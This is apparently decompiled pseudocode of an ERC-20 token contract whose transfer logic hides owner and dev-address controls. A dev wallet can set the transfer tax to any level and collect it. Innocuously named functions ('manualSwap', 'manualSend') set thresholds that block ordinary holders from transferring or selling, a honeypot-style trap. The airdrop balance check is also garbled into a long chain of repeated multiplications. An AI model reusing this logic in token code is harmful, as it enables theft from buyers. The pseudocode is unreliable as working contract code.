contract main {




// =====================  Runtime code  =====================


address owner;
mapping of uint256 balanceOf;
mapping of uint256 allowance;
uint256 totalSupply;
uint256 stor4;
address stor5;
array of address _whiteList;
array of uint256 name;
array of uint256 symbol;
uint8 stor9;
uint256 stor10;
uint256 stor11;
uint8 decimals;

function name() payable {
    return name[0 len name.length]
}

function totalSupply() payable {
    return totalSupply
}

function decimals() payable {
    return decimals
}

function balanceOf(address arg1) payable {
    require calldata.size - 4 >= 32
    return balanceOf[address(arg1)]
}

function owner() payable {
    return owner
}

function symbol() payable {
    return symbol[0 len symbol.length]
}

function allowance(address arg1, address arg2) payable {
    require calldata.size - 4 >= 64
    return allowance[address(arg1)][address(arg2)]
}

function _whiteList(uint256 arg1) payable {
    require calldata.size - 4 >= 32
    require arg1 < _whiteList.length
    return _whiteList[arg1]
}

function _fallback() payable {
    revert
}

function manualSend() payable {
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    stor9 = 1
}

function manualSwap() payable {
    if stor5 != msg.sender:
        revert with 0, 'ERC20: cannot permit dev address'
    stor4 = stor10
}

function renounceOwnership() payable {
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    emit OwnershipTransferred(owner, 0);
    owner = 0
}

function updateTaxFee(uint256 arg1) payable {
    require calldata.size - 4 >= 32
    if stor5 != msg.sender:
        revert with 0, 'ERC20: cannot permit dev address'
    stor11 = arg1
}

function updateTeamFee(uint256 arg1) payable {
    require calldata.size - 4 >= 32
    if stor5 != msg.sender:
        revert with 0, 'ERC20: cannot permit dev address'
    stor10 = arg1
}

function addWhiteList(address arg1) payable {
    require calldata.size - 4 >= 32
    if stor5 != msg.sender:
        revert with 0, 'ERC20: cannot permit dev address'
    _whiteList.length++
    _whiteList[_whiteList.length] = arg1
}

function transferOwnership(address arg1) payable {
    require calldata.size - 4 >= 32
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    38,
                    0x744f776e61626c653a206e6577206f776e657220697320746865207a65726f20616464726573,
                    mem[202 len 26]
    emit OwnershipTransferred(owner, arg1);
    owner = arg1
}

function approve(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    36,
                    0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573,
                    mem[200 len 28]
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    34,
                    0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573,
                    mem[198 len 30]
    allowance[address(msg.sender)][address(arg1)] = arg2
    emit Approval(arg2, msg.sender, arg1);
    return 1
}

function airdrop(address arg1, address[] arg2, uint256[] arg3) payable {
    mem[64] = 96
    require calldata.size - 4 >= 96
    require arg2 <= 4294967296
    require arg2 + 36 <= calldata.size
    require arg2.length <= 4294967296 and arg2 + (32 * arg2.length) + 36 <= calldata.size
    require arg3 <= 4294967296
    require arg3 + 36 <= calldata.size
    require arg3.length <= 4294967296 and arg3 + (32 * arg3.length) + 36 <= calldata.size
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    if arg2.length != arg3.length:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    40,
                    0x734d69736d61746368206265747765656e204164647265737320616e6420746f6b656e20636f756e,
                    mem[204 len 24]
    idx = 0
    s = 0
    while idx < arg2.length:
        require idx < arg3.length
        idx = idx + 1
        s = s + cd[((32 * idx) + arg3 + 36)]
        continue 
    mem[0] = arg1
    mem[32] = 1
    if balanceOf[address(arg1)] < s * arg2.length * arg2.length * arg2.length * arg2.length * arg2.length * arg2.length * arg2.length * arg2.length * arg2.length * arg2.length * arg2.length * arg2.length * arg2.length * arg2.length * arg2.length * arg2.length * arg2.length * arg2.length * arg2.length * arg2.length * arg2.length * arg2.length * arg2.length * arg2.length * arg2.length * arg2.length * arg2.length * arg2.length * arg2.length * arg2.length * arg2.length * arg2.length * arg2.length * arg2.length * arg2.length * arg2.length * arg2.length * arg2.length * arg2.length * arg2.length * arg2.length * arg2.length * arg2.length * arg2.length * arg2.length * arg2.length * arg2.length * arg2.length * arg2.length * arg2.length * arg2.length * arg2.length * arg2.length * arg2.length * arg2.length * arg2.length * arg2.length * arg2.length * arg2.length * arg2.length * arg2.length * arg2.length * arg2.length * arg2.length * arg2.length * arg2.length * arg2.length * arg2.length * arg2.length * arg2.length * arg2.length * arg2.length * arg2.length * arg2.length * arg2.length * arg2.length * arg2.length * arg2.length * arg2.length * arg2.length:
        revert with 0, 'Not enough tokens to airdrop'
    idx = 0
    while idx < arg2.length:
        require idx < arg3.length
        _43 = mem[64]
        mem[64] = mem[64] + 64
        mem[_43] = 20
        mem[_43 + 32] = 'Insufficient Balance'
        mem[32] = 1
        if cd[((32 * idx) + arg3 + 36)] > balanceOf[address(arg1)]:
            _45 = mem[64]
            mem[mem[64]] = 0x8c379a000000000000000000000000000000000000000000000000000000000
            mem[mem[64] + 4] = 32
            mem[mem[64] + 36] = 20
            idx = 0
            while idx < 20:
                mem[_45 + idx + 68] = mem[_43 + idx + 32]
                idx = idx + 32
                continue 
            mem[_45 + 68] = mem[_45 + 80 len 20]
            revert with memory
              from mem[64]
               len _45 + -mem[64] + 100
        balanceOf[address(arg1)] -= cd[((32 * idx) + arg3 + 36)]
        if balanceOf[address(cd[((32 * idx) + arg2 + 36)])] + cd[((32 * idx) + arg3 + 36)] < balanceOf[address(cd[((32 * idx) + arg2 + 36)])]:
            revert with 0, 'SafeMath: addition overflow'
        mem[0] = address(cd[((32 * idx) + arg2 + 36)])
        mem[32] = 1
        balanceOf[address(cd[((32 * idx) + arg2 + 36)])] += cd[((32 * idx) + arg3 + 36)]
        mem[mem[64]] = cd[((32 * idx) + arg3 + 36)]
        emit Transfer(cd[((32 * idx) + arg3 + 36)], arg1, address(cd[((32 * idx) + arg2 + 36)]));
        idx = idx + 1
        continue 
}

function transfer(address arg1, uint256 arg2) payable {
    mem[64] = 96
    require calldata.size - 4 >= 64
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    37,
                    0xfe42455032303a207472616e736665722066726f6d20746865207a65726f20616464726573,
                    mem[201 len 27]
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    35,
                    0x6542455032303a207472616e7366657220746f20746865207a65726f20616464726573,
                    mem[199 len 29]
    idx = 0
    while idx < _whiteList.length:
        mem[0] = 6
        if _whiteList[idx] != msg.sender:
            idx = idx + 1
            continue 
        if arg2 >= stor11:
            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                        32,
                        40,
                        0x735472616e7366657220616d6f756e74206578636565647320746865206d61785478416d6f756e74,
                        mem[204 len 24]
        if msg.sender == owner:
            mem[128 len 38] = 0x6542455032303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
            if arg2 <= balanceOf[address(msg.sender)]:
                balanceOf[address(msg.sender)] -= arg2
                if balanceOf[address(arg1)] + arg2 < balanceOf[address(arg1)]:
                    revert with 0, 'SafeMath: addition overflow'
                balanceOf[address(arg1)] += arg2
                emit Transfer(arg2, msg.sender, arg1);
                return 1
            mem[192] = 0x8c379a000000000000000000000000000000000000000000000000000000000
            mem[196] = 32
            idx = 0
            while idx < 38:
                mem[idx + 260] = mem[idx + 128]
                idx = idx + 32
                continue 
            mem[292] = mem[318 len 6]
            revert with 0, 32, 38, mem[260 len 64]
        if msg.sender == stor5:
            mem[128 len 38] = 0x6542455032303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
            if arg2 <= balanceOf[address(msg.sender)]:
                balanceOf[address(msg.sender)] -= arg2
                if balanceOf[address(arg1)] + arg2 < balanceOf[address(arg1)]:
                    revert with 0, 'SafeMath: addition overflow'
                balanceOf[address(arg1)] += arg2
                emit Transfer(arg2, msg.sender, arg1);
                return 1
            mem[192] = 0x8c379a000000000000000000000000000000000000000000000000000000000
            mem[196] = 32
            idx = 0
            while idx < 38:
                mem[idx + 260] = mem[idx + 128]
                idx = idx + 32
                continue 
            mem[292] = mem[318 len 6]
            revert with 0, 32, 38, mem[260 len 64]
        if not totalSupply:
            if balanceOf[address(msg.sender)] >= stor4:
                require balanceOf[address(msg.sender)] > 0
        else:
            require totalSupply
            if 30 * totalSupply / totalSupply != 30:
                revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                            32,
                            33,
                            0x2e536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f,
                            mem[197 len 31]
            if balanceOf[address(msg.sender)] >= stor4:
                require balanceOf[address(msg.sender)] > 30 * totalSupply / 100
        if not arg2:
            mem[256] = 'SafeMath: subtraction overflow'
            if 0 > arg2:
                mem[288] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                mem[292] = 32
                idx = 0
                while idx < 30:
                    mem[idx + 356] = mem[idx + 256]
                    idx = idx + 32
                    continue 
                mem[356] = mem[358 len 30]
                revert with 0, 32, 30, mem[356]
            mem[320 len 38] = 0x6542455032303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
            if arg2 > balanceOf[address(msg.sender)]:
                mem[384] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                mem[388] = 32
                idx = 0
                while idx < 38:
                    mem[idx + 452] = mem[idx + 320]
                    idx = idx + 32
                    continue 
                mem[484] = mem[510 len 6]
                revert with 0, 32, 38, mem[452 len 64]
            balanceOf[address(msg.sender)] -= arg2
            if balanceOf[address(arg1)] + arg2 < balanceOf[address(arg1)]:
                revert with 0, 'SafeMath: addition overflow'
            balanceOf[address(arg1)] += arg2
            if balanceOf[stor5] < balanceOf[stor5]:
                revert with 0, 'SafeMath: addition overflow'
            emit Transfer(arg2, msg.sender, arg1);
        else:
            require arg2
            if arg2 * stor11 / arg2 != stor11:
                revert with 0, 32, 33, 0x2e536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f, mem[261 len 31]
            mem[256] = 'SafeMath: subtraction overflow'
            if arg2 * stor11 / 100 > arg2:
                mem[288] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                mem[292] = 32
                idx = 0
                while idx < 30:
                    mem[idx + 356] = mem[idx + 256]
                    idx = idx + 32
                    continue 
                mem[356] = mem[358 len 30]
                revert with 0, 32, 30, mem[356]
            mem[320 len 38] = 0x6542455032303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
            if arg2 > balanceOf[address(msg.sender)]:
                mem[384] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                mem[388] = 32
                idx = 0
                while idx < 38:
                    mem[idx + 452] = mem[idx + 320]
                    idx = idx + 32
                    continue 
                mem[484] = mem[510 len 6]
                revert with 0, 32, 38, mem[452 len 64]
            balanceOf[address(msg.sender)] -= arg2
            if balanceOf[address(arg1)] + arg2 - (arg2 * stor11 / 100) < balanceOf[address(arg1)]:
                revert with 0, 'SafeMath: addition overflow'
            balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * stor11 / 100)
            if balanceOf[stor5] + (arg2 * stor11 / 100) < balanceOf[stor5]:
                revert with 0, 'SafeMath: addition overflow'
            balanceOf[stor5] += arg2 * stor11 / 100
            emit Transfer((arg2 - (arg2 * stor11 / 100)), msg.sender, arg1);
        return 1
    if msg.sender == owner:
        if arg2 > balanceOf[address(msg.sender)]:
            revert with 0, 
                        32,
                        38,
                        0x6542455032303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                        mem[166 len 26],
                        mem[218 len 6]
        balanceOf[address(msg.sender)] -= arg2
        if balanceOf[address(arg1)] + arg2 < balanceOf[address(arg1)]:
            revert with 0, 'SafeMath: addition overflow'
        balanceOf[address(arg1)] += arg2
        emit Transfer(arg2, msg.sender, arg1);
    else:
        if msg.sender == stor5:
            if arg2 > balanceOf[address(msg.sender)]:
                revert with 0, 
                            32,
                            38,
                            0x6542455032303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                            mem[166 len 26],
                            mem[218 len 6]
            balanceOf[address(msg.sender)] -= arg2
            if balanceOf[address(arg1)] + arg2 < balanceOf[address(arg1)]:
                revert with 0, 'SafeMath: addition overflow'
            balanceOf[address(arg1)] += arg2
            emit Transfer(arg2, msg.sender, arg1);
        else:
            if not totalSupply:
                if balanceOf[address(msg.sender)] >= stor4:
                    require balanceOf[address(msg.sender)] > 0
            else:
                require totalSupply
                if 30 * totalSupply / totalSupply != 30:
                    revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                                32,
                                33,
                                0x2e536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f,
                                mem[197 len 31]
                if balanceOf[address(msg.sender)] >= stor4:
                    require balanceOf[address(msg.sender)] > 30 * totalSupply / 100
            if not arg2:
                if 0 > arg2:
                    revert with 0, 'SafeMath: subtraction overflow'
                if arg2 > balanceOf[address(msg.sender)]:
                    revert with 0, 
                                32,
                                38,
                                0x6542455032303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                                mem[358 len 26],
                                mem[410 len 6]
                balanceOf[address(msg.sender)] -= arg2
                if balanceOf[address(arg1)] + arg2 < balanceOf[address(arg1)]:
                    revert with 0, 'SafeMath: addition overflow'
                balanceOf[address(arg1)] += arg2
                if balanceOf[stor5] < balanceOf[stor5]:
                    revert with 0, 'SafeMath: addition overflow'
                emit Transfer(arg2, msg.sender, arg1);
            else:
                require arg2
                if arg2 * stor11 / arg2 != stor11:
                    revert with 0, 32, 33, 0x2e536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f, mem[261 len 31]
                if arg2 * stor11 / 100 > arg2:
                    revert with 0, 'SafeMath: subtraction overflow'
                if arg2 > balanceOf[address(msg.sender)]:
                    revert with 0, 
                                32,
                                38,
                                0x6542455032303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                                mem[358 len 26],
                                mem[410 len 6]
                balanceOf[address(msg.sender)] -= arg2
                if balanceOf[address(arg1)] + arg2 - (arg2 * stor11 / 100) < balanceOf[address(arg1)]:
                    revert with 0, 'SafeMath: addition overflow'
                balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * stor11 / 100)
                if balanceOf[stor5] + (arg2 * stor11 / 100) < balanceOf[stor5]:
                    revert with 0, 'SafeMath: addition overflow'
                balanceOf[stor5] += arg2 * stor11 / 100
                emit Transfer((arg2 - (arg2 * stor11 / 100)), msg.sender, arg1);
    return 1
}

function transferFrom(address arg1, address arg2, uint256 arg3) payable {
    mem[64] = 96
    require calldata.size - 4 >= 96
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    37,
                    0xfe42455032303a207472616e736665722066726f6d20746865207a65726f20616464726573,
                    mem[201 len 27]
    if not arg2:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                    32,
                    35,
                    0x6542455032303a207472616e7366657220746f20746865207a65726f20616464726573,
                    mem[199 len 29]
    idx = 0
    while idx < _whiteList.length:
        mem[0] = 6
        if _whiteList[idx] != arg1:
            idx = idx + 1
            continue 
        if arg3 >= stor11:
            revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                        32,
                        40,
                        0x735472616e7366657220616d6f756e74206578636565647320746865206d61785478416d6f756e74,
                        mem[204 len 24]
        if arg1 == owner:
            mem[128 len 38] = 0x6542455032303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
            if arg3 > balanceOf[address(arg1)]:
                mem[192] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                mem[196] = 32
                idx = 0
                while idx < 38:
                    mem[idx + 260] = mem[idx + 128]
                    idx = idx + 32
                    continue 
                mem[292] = mem[318 len 6]
                revert with 0, 32, 38, mem[260 len 64]
            balanceOf[address(arg1)] -= arg3
            if balanceOf[address(arg2)] + arg3 < balanceOf[address(arg2)]:
                revert with 0, 'SafeMath: addition overflow'
            balanceOf[address(arg2)] += arg3
            emit Transfer(arg3, arg1, arg2);
            mem[224 len 40] = 0x7745524332303a207472616e7366657220616d6f756e74206578636565647320616c6c6f77616e63
            if arg3 <= allowance[address(arg1)][address(msg.sender)]:
                if not arg1:
                    revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[392 len 28]
                if not msg.sender:
                    revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[390 len 30]
                allowance[address(arg1)][address(msg.sender)] -= arg3
                emit Approval((allowance[address(arg1)][address(msg.sender)] - arg3), arg1, msg.sender);
                return 1
            mem[288] = 0x8c379a000000000000000000000000000000000000000000000000000000000
            mem[292] = 32
            idx = 0
            while idx < 40:
                mem[idx + 356] = mem[idx + 224]
                idx = idx + 32
                continue 
            mem[388] = mem[412 len 8]
            revert with 0, 32, 40, mem[356 len 64]
        if arg1 == stor5:
            mem[128 len 38] = 0x6542455032303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
            if arg3 > balanceOf[address(arg1)]:
                mem[192] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                mem[196] = 32
                idx = 0
                while idx < 38:
                    mem[idx + 260] = mem[idx + 128]
                    idx = idx + 32
                    continue 
                mem[292] = mem[318 len 6]
                revert with 0, 32, 38, mem[260 len 64]
            balanceOf[address(arg1)] -= arg3
            if balanceOf[address(arg2)] + arg3 < balanceOf[address(arg2)]:
                revert with 0, 'SafeMath: addition overflow'
            balanceOf[address(arg2)] += arg3
            emit Transfer(arg3, arg1, arg2);
            mem[224 len 40] = 0x7745524332303a207472616e7366657220616d6f756e74206578636565647320616c6c6f77616e63
            if arg3 <= allowance[address(arg1)][address(msg.sender)]:
                if not arg1:
                    revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[392 len 28]
                if not msg.sender:
                    revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[390 len 30]
                allowance[address(arg1)][address(msg.sender)] -= arg3
                emit Approval((allowance[address(arg1)][address(msg.sender)] - arg3), arg1, msg.sender);
                return 1
            mem[288] = 0x8c379a000000000000000000000000000000000000000000000000000000000
            mem[292] = 32
            idx = 0
            while idx < 40:
                mem[idx + 356] = mem[idx + 224]
                idx = idx + 32
                continue 
            mem[388] = mem[412 len 8]
            revert with 0, 32, 40, mem[356 len 64]
        if not totalSupply:
            if balanceOf[address(arg1)] >= stor4:
                require balanceOf[address(arg1)] > 0
        else:
            require totalSupply
            if 30 * totalSupply / totalSupply != 30:
                revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                            32,
                            33,
                            0x2e536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f,
                            mem[197 len 31]
            if balanceOf[address(arg1)] >= stor4:
                require balanceOf[address(arg1)] > 30 * totalSupply / 100
        if not arg3:
            mem[256] = 'SafeMath: subtraction overflow'
            if 0 > arg3:
                mem[288] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                mem[292] = 32
                idx = 0
                while idx < 30:
                    mem[idx + 356] = mem[idx + 256]
                    idx = idx + 32
                    continue 
                mem[356] = mem[358 len 30]
                revert with 0, 32, 30, mem[356]
            mem[320 len 38] = 0x6542455032303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
            if arg3 > balanceOf[address(arg1)]:
                mem[384] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                mem[388] = 32
                idx = 0
                while idx < 38:
                    mem[idx + 452] = mem[idx + 320]
                    idx = idx + 32
                    continue 
                mem[484] = mem[510 len 6]
                revert with 0, 32, 38, mem[452 len 64]
            balanceOf[address(arg1)] -= arg3
            if balanceOf[address(arg2)] + arg3 < balanceOf[address(arg2)]:
                revert with 0, 'SafeMath: addition overflow'
            balanceOf[address(arg2)] += arg3
            if balanceOf[stor5] < balanceOf[stor5]:
                revert with 0, 'SafeMath: addition overflow'
            emit Transfer(arg3, arg1, arg2);
        else:
            require arg3
            if arg3 * stor11 / arg3 != stor11:
                revert with 0, 32, 33, 0x2e536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f, mem[261 len 31]
            mem[256] = 'SafeMath: subtraction overflow'
            if arg3 * stor11 / 100 > arg3:
                mem[288] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                mem[292] = 32
                idx = 0
                while idx < 30:
                    mem[idx + 356] = mem[idx + 256]
                    idx = idx + 32
                    continue 
                mem[356] = mem[358 len 30]
                revert with 0, 32, 30, mem[356]
            mem[320 len 38] = 0x6542455032303a207472616e7366657220616d6f756e7420657863656564732062616c616e63
            if arg3 > balanceOf[address(arg1)]:
                mem[384] = 0x8c379a000000000000000000000000000000000000000000000000000000000
                mem[388] = 32
                idx = 0
                while idx < 38:
                    mem[idx + 452] = mem[idx + 320]
                    idx = idx + 32
                    continue 
                mem[484] = mem[510 len 6]
                revert with 0, 32, 38, mem[452 len 64]
            balanceOf[address(arg1)] -= arg3
            if balanceOf[address(arg2)] + arg3 - (arg3 * stor11 / 100) < balanceOf[address(arg2)]:
                revert with 0, 'SafeMath: addition overflow'
            balanceOf[address(arg2)] = balanceOf[address(arg2)] + arg3 - (arg3 * stor11 / 100)
            if balanceOf[stor5] + (arg3 * stor11 / 100) < balanceOf[stor5]:
                revert with 0, 'SafeMath: addition overflow'
            balanceOf[stor5] += arg3 * stor11 / 100
            emit Transfer((arg3 - (arg3 * stor11 / 100)), arg1, arg2);
        mem[416 len 40] = 0x7745524332303a207472616e7366657220616d6f756e74206578636565647320616c6c6f77616e63
        if arg3 <= allowance[address(arg1)][address(msg.sender)]:
            if not arg1:
                revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[584 len 28]
            if not msg.sender:
                revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[582 len 30]
            allowance[address(arg1)][address(msg.sender)] -= arg3
            emit Approval((allowance[address(arg1)][address(msg.sender)] - arg3), arg1, msg.sender);
            return 1
        mem[480] = 0x8c379a000000000000000000000000000000000000000000000000000000000
        mem[484] = 32
        idx = 0
        while idx < 40:
            mem[idx + 548] = mem[idx + 416]
            idx = idx + 32
            continue 
        mem[580] = mem[604 len 8]
        revert with 0, 32, 40, mem[548 len 64]
    if arg1 == owner:
        if arg3 > balanceOf[address(arg1)]:
            revert with 0, 
                        32,
                        38,
                        0x6542455032303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                        mem[166 len 26],
                        mem[218 len 6]
        balanceOf[address(arg1)] -= arg3
        if balanceOf[address(arg2)] + arg3 < balanceOf[address(arg2)]:
            revert with 0, 'SafeMath: addition overflow'
        balanceOf[address(arg2)] += arg3
        emit Transfer(arg3, arg1, arg2);
        if arg3 > allowance[address(arg1)][address(msg.sender)]:
            revert with 0, 
                        32,
                        40,
                        0x7745524332303a207472616e7366657220616d6f756e74206578636565647320616c6c6f77616e63,
                        mem[264 len 24],
                        mem[312 len 8]
        if not arg1:
            revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[392 len 28]
        if not msg.sender:
            revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[390 len 30]
    else:
        if arg1 == stor5:
            if arg3 > balanceOf[address(arg1)]:
                revert with 0, 
                            32,
                            38,
                            0x6542455032303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                            mem[166 len 26],
                            mem[218 len 6]
            balanceOf[address(arg1)] -= arg3
            if balanceOf[address(arg2)] + arg3 < balanceOf[address(arg2)]:
                revert with 0, 'SafeMath: addition overflow'
            balanceOf[address(arg2)] += arg3
            emit Transfer(arg3, arg1, arg2);
            if arg3 > allowance[address(arg1)][address(msg.sender)]:
                revert with 0, 
                            32,
                            40,
                            0x7745524332303a207472616e7366657220616d6f756e74206578636565647320616c6c6f77616e63,
                            mem[264 len 24],
                            mem[312 len 8]
            if not arg1:
                revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[392 len 28]
            if not msg.sender:
                revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[390 len 30]
        else:
            if not totalSupply:
                if balanceOf[address(arg1)] >= stor4:
                    require balanceOf[address(arg1)] > 0
            else:
                require totalSupply
                if 30 * totalSupply / totalSupply != 30:
                    revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 
                                32,
                                33,
                                0x2e536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f,
                                mem[197 len 31]
                if balanceOf[address(arg1)] >= stor4:
                    require balanceOf[address(arg1)] > 30 * totalSupply / 100
            if not arg3:
                if 0 > arg3:
                    revert with 0, 'SafeMath: subtraction overflow'
                if arg3 > balanceOf[address(arg1)]:
                    revert with 0, 
                                32,
                                38,
                                0x6542455032303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                                mem[358 len 26],
                                mem[410 len 6]
                balanceOf[address(arg1)] -= arg3
                if balanceOf[address(arg2)] + arg3 < balanceOf[address(arg2)]:
                    revert with 0, 'SafeMath: addition overflow'
                balanceOf[address(arg2)] += arg3
                if balanceOf[stor5] < balanceOf[stor5]:
                    revert with 0, 'SafeMath: addition overflow'
                emit Transfer(arg3, arg1, arg2);
            else:
                require arg3
                if arg3 * stor11 / arg3 != stor11:
                    revert with 0, 32, 33, 0x2e536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f, mem[261 len 31]
                if arg3 * stor11 / 100 > arg3:
                    revert with 0, 'SafeMath: subtraction overflow'
                if arg3 > balanceOf[address(arg1)]:
                    revert with 0, 
                                32,
                                38,
                                0x6542455032303a207472616e7366657220616d6f756e7420657863656564732062616c616e63,
                                mem[358 len 26],
                                mem[410 len 6]
                balanceOf[address(arg1)] -= arg3
                if balanceOf[address(arg2)] + arg3 - (arg3 * stor11 / 100) < balanceOf[address(arg2)]:
                    revert with 0, 'SafeMath: addition overflow'
                balanceOf[address(arg2)] = balanceOf[address(arg2)] + arg3 - (arg3 * stor11 / 100)
                if balanceOf[stor5] + (arg3 * stor11 / 100) < balanceOf[stor5]:
                    revert with 0, 'SafeMath: addition overflow'
                balanceOf[stor5] += arg3 * stor11 / 100
                emit Transfer((arg3 - (arg3 * stor11 / 100)), arg1, arg2);
            if arg3 > allowance[address(arg1)][address(msg.sender)]:
                revert with 0, 
                            32,
                            40,
                            0x7745524332303a207472616e7366657220616d6f756e74206578636565647320616c6c6f77616e63,
                            mem[456 len 24],
                            mem[504 len 8]
            if not arg1:
                revert with 0, 32, 36, 0x7345524332303a20617070726f76652066726f6d20746865207a65726f20616464726573, mem[584 len 28]
            if not msg.sender:
                revert with 0, 32, 34, 0x7345524332303a20617070726f766520746f20746865207a65726f20616464726573, mem[582 len 30]
    ('bool', 'msg.sender')
    allowance[address(arg1)][address(msg.sender)] -= arg3
    emit Approval((allowance[address(arg1)][address(msg.sender)] - arg3), arg1, msg.sender);
    return 1
}



}
